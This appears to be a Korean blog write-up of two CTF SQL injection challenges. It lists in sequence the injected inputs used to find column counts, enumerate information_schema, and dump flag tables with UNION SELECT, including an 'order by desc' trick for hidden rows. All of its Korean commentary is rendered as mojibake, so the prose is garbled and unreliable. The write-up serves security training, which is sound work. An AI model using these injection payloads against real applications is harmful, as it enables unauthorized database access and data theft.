---
layout: post
comments: true
sitemap:
    changefreq: daily
    priority: 0.5

title: "[CTF] CTF ë¬¸ì œ í’€ì´: SQL Injection w. UNION"
excerpt: "ëª¨ì˜í•´í‚¹ ì·¨ì—…ë°˜ ìŠ¤í„°ë”” 7ê¸° 6ì£¼ì°¨"

date: 2024-11-25
last_modified_at: 2024-11-25

tags: [TIL, WEB, DATABASE, CTF]
---

# ëª©ì°¨
* [1ë²ˆì§¸ ë¬¸ì œ](#1ë²ˆì§¸-ë¬¸ì œ)
* [2ë²ˆì§¸ ë¬¸ì œ](#2ë²ˆì§¸-ë¬¸ì œ)

# 1ë²ˆì§¸ ë¬¸ì œ
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-1.png?raw=true)
ì²˜ìŒ ë“¤ì–´ê°€ë©´ ë³¼ ìˆ˜ ìˆëŠ” í™”ë©´ì´ë‹¤. SQL Injection ë¬¸ì œë¼ê³  ì œëª©ë¶€í„° ë°•í˜€ìˆìœ¼ë‹ˆ ì–Œì „íˆ queryë¬¸ì„ ì‘ì„±í•˜ê² ë‹¤.

## SQL Query íŒŒì•…
1. **adminer**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-2.png?raw=true)  
    * ğŸ¤” ëŒ€ì†Œë¬¸ì êµ¬ë¶„ì´ ì—†êµ¬ë‚˜!
  
2. ğŸ«£ **~~adminer'~~** -> X
  
3. **a%**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-3.png?raw=true)
    * ğŸ¤” like êµ¬ì ˆì´ ìˆêµ¬ë‚˜
  
4. ğŸ«£ **~~a#~~** -> X
  
5. ğŸ«£ **~~a'#~~** -> X
  
6. **a%'#**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-4.png?raw=true)
    * ğŸ«£ ~~ì…ë ¥ê°’ì´ ë“¤ì–´ê°€ëŠ” ê³³ì´ like ìœ„ì¹˜ì¸ê°€ ë³´ë‹¤~~
    * ğŸ¤” queryì— ê´„í˜¸ ì•ˆ ì‚¬ìš©í•˜ê³  ì£¼ì„ í•„í„°ë§ ì—†ë‚˜ ë³´ë‹¤
  
7. ğŸ«£ **~~' and '1' = '1~~** -> X
  
8. ğŸ«£ **~~%' and '1' = '1~~** -> X
  
9. **' and '1' = '1'#**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-5.png?raw=true)
  
## column ê°œìˆ˜ íŒŒì•…í•˜ê¸°
10. **' order by 1, 2, 3, 4 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-6.png?raw=true)  
    * ğŸ’¡ ë³´ì´ëŠ” columnì´ 4ê°œë‹ˆê¹Œ 4ê°œë¶€í„° ì‹œì‘í–ˆë‹¤.  
  
11. **' order by 1, 2, 3, 4, 5 #** -> X
    * ğŸ¤” columnì˜ ê°œìˆ˜ê°€ 4ê°œêµ¬ë§Œ
  
## UNION ì‚¬ìš© ê°€ëŠ¥í•œì§€ í™•ì¸í•˜ê¸°
12. **' union select 1, 2, 3, 4 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-7.png?raw=true)
  
## DATABASE ì´ë¦„ í™•ì¸í•˜ê¸°
13. **' union select database(), 2, 3, 4 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-8.png?raw=true)
    * ğŸ’¡ database ì´ë¦„ì€ sqli_1ì´ì—ˆë‹¤.
  
## TABLE ì´ë¦„ í™•ì¸í•˜ê¸°
19. **' union select table_name, 2, 3, 4 from information_schema.tables where table_schema = 'sqli_1' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-9.png?raw=true)
    * ğŸ’¡ tableì´ ì´ 3ê°œê°€ ë‚˜ì™”ëŠ”ë°, ë”± ë´ë„ ìˆ˜ìƒí•´ ë³´ì´ëŠ” flag_tableì™€ plusFlag_Tableë¥¼ ë¨¼ì € ì‹œë„í•˜ê¸°ë¡œ í–ˆë‹¤.
  
## COLUMN ì´ë¦„ í™•ì¸í•˜ê¸°
20. **' union select 1, column_name, 3, 4 from information_schema.columns where table_name = 'flag_table' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-10.png?raw=true)
    * ğŸ’¡ flag_tableì—ì„œëŠ” flagë¼ëŠ” columnì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤.  
  
21. **' union select 1, column_name, 3, 4 from information_schema.columns where table_name = 'plusFlag_Table' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-11.png?raw=true)
    * ğŸ’¡ plusFlag_Tableì—ì„œëŠ” idxê³¼ flagë¼ëŠ” columnë“¤ì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤.
  
## DATA ì¶”ì¶œí•˜ê¸°
22. **' union select flag, 2, 3, 4 from flag_table #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-12.png?raw=true)
  
23. **' union select idx, flag, 3, 4 from plusFlag_Table #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-13.png?raw=true)
  
# 2ë²ˆì§¸ ë¬¸ì œ
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-14.png?raw=true)
ìœ„ìª½ ë¬¸ì œë‘ ë³´ì´ê¸°ì—ëŠ” ë¹„ìŠ·í•´ë³´ì¸ë‹¤.
  
## SQL Query íŒŒì•…
1. **normaltic**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-15.png?raw=true)
    * ğŸ’¡ ë³´ì´ëŠ” columnì€ ID, Level, Rank Point, info  
  
2. **normaltic' and '1' = '1**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-16.png?raw=true)
    * ğŸ’¡ IDê°€ ì…ë ¥í•œ ê·¸ëŒ€ë¡œ ë³´ì„  
  
3. ğŸ«£ **~~*~~** -> X
  
## column ê°œìˆ˜ íŒŒì•…í•˜ê¸°
4. **normaltic' order by 1, 2, 3, 4 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-17.png?raw=true)
    * ğŸ’¡ ë³´ì´ëŠ” columnì´ 4ê°œë‹ˆê¹Œ 4ê°œë¶€í„° ì‹œì‘í–ˆë‹¤.
  
5. **normaltic' order by 1, 2, 3, 4, 5 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-18.png?raw=true)
  
6. **normaltic' order by 1, 2, 3, 4, 5, 6 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-19.png?raw=true)
  
7. **normaltic' order by 1, 2, 3, 4, 5, 6, 7 #** -> X
    * ğŸ¤” columnì˜ ê°œìˆ˜ê°€ 6ê°œêµ¬ë§Œ
  
## ì¶œë ¥ë˜ëŠ” column ìœ„ì¹˜ ì°¾ê¸°, DATABASE ì´ë¦„ í™•ì¸í•˜ê¸°
8. **' union select 1, 2, 3, 4, 5, 6 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-20.png?raw=true)
    * ğŸ’¡ ë³´ì´ëŠ” columnì€ 6ë²ˆ ìœ„ì¹˜ì— ìˆì—ˆë‹¤.  
  
10. **' union select 1, 2, 3, 4, 5, database() #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-21.png?raw=true)
    * ğŸ’¡ database ì´ë¦„ì€ sqli_5ì´ë‹¤.
  
## TABLE ì´ë¦„ í™•ì¸í•˜ê¸°
11. **' union select 1, 2, 3, 4, 5, table_name from information_schema.tables where table_schema = 'sqli_5' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-22.png?raw=true)
    * ğŸ’¡ table ì´ë¦„ì€ flag_honeyì˜€ë‹¤.
  
## COLUMN ì´ë¦„ í™•ì¸í•˜ê¸°
12. **' union select 1, 2, 3, 4, 5, column_name from information_schema.columns where table_name = 'flag_honey' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-23.png?raw=true)
    * ğŸ’¡ column ì´ë¦„ì€ flagì˜€ë‹¤.
  
## DATA ì¶”ì¶œí•˜ê¸°
13. **' union select 1, 2, 3, 4, 5, flag from flag_honey #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-24.png?raw=true)
    * ğŸ˜¬ ì–´ì©ì§€ êµ¬ë¼í•‘ì˜ ëƒ„ìƒˆê°€ ë‚˜ë”ë¼
  
## TABLE ì´ë¦„ í™•ì¸í•˜ê¸°
11. **' union select 1, 2, 3, 4, 5, table_name from information_schema.tables where table_schema = 'sqli_5' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-22.png?raw=true)
    * ğŸ¤” ì™œ 1ê°œì”© ë°–ì— ì•ˆ ë³´ì¼ê¹Œ?
        * ğŸ¤” rowê°€ ë”± í•œ ê°œë‹¤?
        * ğŸ¤” rowë¥¼ í•œ ê°œì”©ë§Œ ë³´ì—¬ì¤€ë‹¤?
            * ğŸ¤” ë‹¤ë¥¸ rowê°€ ë” ìˆëŠ”ë° ì•ˆ ë³´ì´ëŠ” ê²Œ ì•„ë‹ê¹Œ?
            * ğŸ¤” ë‹¤ë¥¸ rowë¥¼ ë³´ë ¤ë©´ ì–´ë–¤ ê±¸ í•  ìˆ˜ ìˆì„ê¹Œ?
  
12. **' union select 1, 2, 3, 4, 5, table_name from information_schema.tables order by 6 desc#**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-25.png?raw=true)
    * ğŸ’¡ viewë¼ëŠ” ë‹¤ë¥¸ tableì´ ë³´ì—¬ìš” ì¢‹ì•„ìš”
    * ğŸ¤” rowë¥¼ í•œ ê°œì”©ë§Œ ë³´ì—¬ì¤€ë‹¤ê°€ ë§ëŠ” ê°€ì •ì´ê² ë„¤
  
13. **' union select 1, 2, 3, 4, 5, table_name from information_schema.tables where table_schema = 'sqli_5' order by 6 desc #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-26.png?raw=true)
    * ğŸ’¡ ë”± ë´ë„ ìˆ˜ìƒí•œ table ì´ë¦„ì´ë‹¤.
  
## COLUMN ì´ë¦„ í™•ì¸í•˜ê³  DATA ì¶”ì¶œí•˜ê¸° 1
12. **' union select 1, 2, 3, 4, 5, column_name from information_schema.columns where table_name = 'secret' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-27.png?raw=true)
    * ğŸ’¡ column ì´ë¦„ì€ flagì˜€ë‹¤.  
  
13. **' union select 1, 2, 3, 4, 5, flag from secret #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-28.png?raw=true)
    * ğŸ˜¬ ì•„ë‹ˆ ã…‹ã…‹ã…‹ ë‹¹í–ˆë‹¤
    * ğŸ¤” ì—¬ê¸°ì„œë„ ì—­ìˆœìœ¼ë¡œ ì •ë ¬í•´ë³¼ê¹Œ?  
  
15. **' union select 1, 2, 3, 4, 5, flag from secret order by 6 desc #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-29.png?raw=true)